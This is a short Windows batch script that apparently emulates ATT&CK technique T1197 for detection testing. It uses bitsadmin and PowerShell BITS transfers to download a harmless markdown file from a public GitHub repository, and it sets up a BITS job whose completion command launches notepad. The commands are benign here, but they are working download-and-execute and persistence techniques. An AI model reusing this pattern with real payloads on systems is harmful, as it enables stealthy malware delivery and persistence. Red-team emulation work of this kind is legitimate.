@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: BITS Jobs (T1197)
ECHO.
ECHO [+] Executing 'BITADMIN' 
ECHO -------------------------------------------------------------------
bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %EXFIL%\bitsadmin_flag.ps1
bitsadmin.exe /create AtomicBITS
bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md  %EXFIL%\bitsadmin_flag.ps1
bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe %EXFIL%\bitsadmin_flag.ps1
bitsadmin.exe /resume AtomicBITS
ECHO.


ECHO [+] Executing 'BITSTRANSFER' using Powershell
ECHO -------------------------------------------------------------------
powershell Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination %temp%\bitsadmin_flag.ps1
ECHO.
